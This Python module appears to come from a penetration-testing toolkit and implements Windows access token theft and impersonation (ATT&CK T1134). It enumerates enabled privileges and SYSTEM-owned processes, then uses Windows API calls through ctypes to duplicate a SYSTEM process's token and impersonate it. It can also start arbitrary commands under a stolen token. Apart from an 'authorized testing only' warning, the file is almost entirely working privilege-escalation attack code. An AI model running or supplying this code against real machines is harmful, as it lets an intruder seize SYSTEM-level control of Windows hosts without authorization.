#!/usr/bin/env python3
"""
Token 操纵模块 - Token Manipulation Module
ATT&CK Technique: T1134 - Access Token Manipulation

提供 Windows Token 操纵功能
仅用于授权渗透测试和安全研究

Warning: 仅限授权渗透测试使用！
"""

import logging
import platform
from dataclasses import dataclass
from enum import Enum
from typing import Any, Dict, List

from ..base import EscalationMethod, EscalationResult, PrivilegeLevel

logger = logging.getLogger(__name__)


class TokenPrivilege(Enum):
    """Token 权限"""

    SE_DEBUG = "SeDebugPrivilege"
    SE_IMPERSONATE = "SeImpersonatePrivilege"
    SE_ASSIGN_PRIMARY_TOKEN = "SeAssignPrimaryTokenPrivilege"
    SE_INCREASE_QUOTA = "SeIncreaseQuotaPrivilege"
    SE_TCB = "SeTcbPrivilege"
    SE_BACKUP = "SeBackupPrivilege"
    SE_RESTORE = "SeRestorePrivilege"
    SE_TAKE_OWNERSHIP = "SeTakeOwnershipPrivilege"


@dataclass
class ProcessInfo:
    """进程信息"""

    pid: int
    name: str
    username: str = ""
    session_id: int = 0
    integrity: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "pid": self.pid,
            "name": self.name,
            "username": self.username,
            "session_id": self.session_id,
            "integrity": self.integrity,
        }


class TokenManipulation:
    """
    Token 操纵模块

    实现 Token 窃取和模拟功能

    Usage:
        manip = TokenManipulation()
        result = manip.impersonate_system()

    Warning: 仅限授权渗透测试使用！
    """

    def __init__(self):
        self.logger = logging.getLogger(f"{__name__}.TokenManipulation")

    def get_current_privileges(self) -> List[str]:
        """获取当前进程的权限"""
        privileges = []

        try:
            import subprocess

            result = subprocess.run(["whoami", "/priv"], capture_output=True, text=True, timeout=10)

            if result.returncode == 0:
                for line in result.stdout.split("\n"):
                    for priv in TokenPrivilege:
                        if priv.value in line and "Enabled" in line:
                            privileges.append(priv.value)

        except Exception as e:
            self.logger.warning(f"Failed to get privileges: {e}")

        return privileges

    def has_privilege(self, privilege: TokenPrivilege) -> bool:
        """检查是否有特定权限"""
        return privilege.value in self.get_current_privileges()

    def list_high_privilege_processes(self) -> List[ProcessInfo]:
        """列出高权限进程"""
        processes = []

        try:
            import subprocess

            result = subprocess.run(
                ["tasklist", "/v", "/fo", "csv"], capture_output=True, text=True, timeout=30
            )

            if result.returncode == 0:
                lines = result.stdout.strip().split("\n")[1:]  # 跳过标题行

                for line in lines:
                    try:
                        parts = line.replace('"', "").split(",")
                        if len(parts) >= 7:
                            name = parts[0]
                            pid = int(parts[1])
                            username = parts[6] if len(parts) > 6 else ""

                            # 筛选 SYSTEM 进程
                            if "SYSTEM" in username or "NT AUTHORITY" in username:
                                processes.append(ProcessInfo(pid=pid, name=name, username=username))
                    except (ValueError, IndexError):
                        continue

        except Exception as e:
            self.logger.warning(f"Failed to list processes: {e}")

        return processes

    def impersonate_system(self) -> EscalationResult:
        """
        模拟 SYSTEM 用户

        需要 SeDebugPrivilege 或 SeImpersonatePrivilege

        Returns:
            EscalationResult
        """
        # 平台检测
        if platform.system() != "Windows":
            return EscalationResult(
                success=False,
                method=EscalationMethod.TOKEN_IMPERSONATION,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.MEDIUM,
                error="Token manipulation is only supported on Windows",
            )

        # 检查必要权限
        privileges = self.get_current_privileges()

        if not (
            TokenPrivilege.SE_DEBUG.value in privileges
            or TokenPrivilege.SE_IMPERSONATE.value in privileges
        ):
            return EscalationResult(
                success=False,
                method=EscalationMethod.TOKEN_IMPERSONATION,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.MEDIUM,
                error="Missing required privilege: SeDebugPrivilege or SeImpersonatePrivilege",
            )

        # 查找 SYSTEM 进程
        system_processes = self.list_high_privilege_processes()

        if not system_processes:
            return EscalationResult(
                success=False,
                method=EscalationMethod.TOKEN_IMPERSONATION,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.MEDIUM,
                error="No SYSTEM processes found",
            )

        # 尝试窃取 Token（使用 Python Windows API）
        try:
            # 注意：完整实现需要 pywin32 或 ctypes 调用 Windows API
            # 这里提供框架代码

            # 目标：打开进程，复制 Token，创建新进程
            target_process = system_processes[0]

            return self._steal_token_ctypes(target_process.pid)

        except Exception as e:
            return EscalationResult(
                success=False,
                method=EscalationMethod.TOKEN_IMPERSONATION,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.MEDIUM,
                error=str(e),
            )

    def _steal_token_ctypes(self, target_pid: int) -> EscalationResult:
        """
        使用 ctypes 窃取 Token

        Args:
            target_pid: 目标进程 PID
        """
        try:
            import ctypes
            from ctypes import wintypes

            # Windows API 常量
            PROCESS_QUERY_INFORMATION = 0x0400
            TOKEN_DUPLICATE = 0x0002
            TOKEN_IMPERSONATE = 0x0004
            TOKEN_QUERY = 0x0008
            SECURITY_IMPERSONATION = 2
            TOKEN_TYPE_IMPERSONATION = 2

            # 加载库
            kernel32 = ctypes.windll.kernel32
            advapi32 = ctypes.windll.advapi32

            # 打开目标进程
            h_process = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, target_pid)

            if not h_process:
                return EscalationResult(
                    success=False,
                    method=EscalationMethod.TOKEN_IMPERSONATION,
                    from_level=PrivilegeLevel.MEDIUM,
                    to_level=PrivilegeLevel.MEDIUM,
                    error=f"Failed to open process {target_pid}",
                )

            try:
                # 打开进程 Token
                h_token = wintypes.HANDLE()
                if not advapi32.OpenProcessToken(
                    h_process,
                    TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
                    ctypes.byref(h_token),
                ):
                    return EscalationResult(
                        success=False,
                        method=EscalationMethod.TOKEN_IMPERSONATION,
                        from_level=PrivilegeLevel.MEDIUM,
                        to_level=PrivilegeLevel.MEDIUM,
                        error="Failed to open process token",
                    )

                try:
                    # 复制 Token
                    h_new_token = wintypes.HANDLE()
                    if not advapi32.DuplicateTokenEx(
                        h_token,
                        0x02000000,  # MAXIMUM_ALLOWED
                        None,
                        SECURITY_IMPERSONATION,
                        TOKEN_TYPE_IMPERSONATION,
                        ctypes.byref(h_new_token),
                    ):
                        return EscalationResult(
                            success=False,
                            method=EscalationMethod.TOKEN_IMPERSONATION,
                            from_level=PrivilegeLevel.MEDIUM,
                            to_level=PrivilegeLevel.MEDIUM,
                            error="Failed to duplicate token",
                        )

                    try:
                        # 模拟用户
                        if not advapi32.ImpersonateLoggedOnUser(h_new_token):
                            return EscalationResult(
                                success=False,
                                method=EscalationMethod.TOKEN_IMPERSONATION,
                                from_level=PrivilegeLevel.MEDIUM,
                                to_level=PrivilegeLevel.MEDIUM,
                                error="Failed to impersonate user",
                            )

                        return EscalationResult(
                            success=True,
                            method=EscalationMethod.TOKEN_IMPERSONATION,
                            from_level=PrivilegeLevel.MEDIUM,
                            to_level=PrivilegeLevel.SYSTEM,
                            output=f"Successfully impersonated token from PID {target_pid}",
                            evidence=f"Target PID: {target_pid}",
                        )

                    finally:
                        kernel32.CloseHandle(h_new_token)

                finally:
                    kernel32.CloseHandle(h_token)

            finally:
                kernel32.CloseHandle(h_process)

        except ImportError:
            return EscalationResult(
                success=False,
                method=EscalationMethod.TOKEN_IMPERSONATION,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.MEDIUM,
                error="ctypes not available",
            )

        except Exception as e:
            return EscalationResult(
                success=False,
                method=EscalationMethod.TOKEN_IMPERSONATION,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.MEDIUM,
                error=str(e),
            )

    def create_process_with_token(self, token_handle: int, command: str) -> bool:
        """
        使用窃取的 Token 创建新进程

        Args:
            token_handle: Token 句柄
            command: 要执行的命令

        Returns:
            是否成功
        """
        try:
            import ctypes
            from ctypes import wintypes

            kernel32 = ctypes.windll.kernel32
            advapi32 = ctypes.windll.advapi32

            # STARTUPINFO 结构
            class STARTUPINFO(ctypes.Structure):
                _fields_ = [
                    ("cb", wintypes.DWORD),
                    ("lpReserved", wintypes.LPWSTR),
                    ("lpDesktop", wintypes.LPWSTR),
                    ("lpTitle", wintypes.LPWSTR),
                    ("dwX", wintypes.DWORD),
                    ("dwY", wintypes.DWORD),
                    ("dwXSize", wintypes.DWORD),
                    ("dwYSize", wintypes.DWORD),
                    ("dwXCountChars", wintypes.DWORD),
                    ("dwYCountChars", wintypes.DWORD),
                    ("dwFillAttribute", wintypes.DWORD),
                    ("dwFlags", wintypes.DWORD),
                    ("wShowWindow", wintypes.WORD),
                    ("cbReserved2", wintypes.WORD),
                    ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
                    ("hStdInput", wintypes.HANDLE),
                    ("hStdOutput", wintypes.HANDLE),
                    ("hStdError", wintypes.HANDLE),
                ]

            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("hProcess", wintypes.HANDLE),
                    ("hThread", wintypes.HANDLE),
                    ("dwProcessId", wintypes.DWORD),
                    ("dwThreadId", wintypes.DWORD),
                ]

            startup_info = STARTUPINFO()
            startup_info.cb = ctypes.sizeof(STARTUPINFO)

            process_info = PROCESS_INFORMATION()

            result = advapi32.CreateProcessWithTokenW(
                token_handle,
                0,  # LOGON_WITH_PROFILE
                None,
                command,
                0,  # CREATE_NEW_CONSOLE
                None,
                None,
                ctypes.byref(startup_info),
                ctypes.byref(process_info),
            )

            success = bool(result)

            # 关闭进程和线程句柄，防止资源泄漏
            if process_info.hProcess:
                kernel32.CloseHandle(process_info.hProcess)
            if process_info.hThread:
                kernel32.CloseHandle(process_info.hThread)

            return success

        except Exception as e:
            self.logger.error(f"CreateProcessWithToken failed: {e}")
            return False


__all__ = ["TokenManipulation", "TokenPrivilege", "ProcessInfo"]
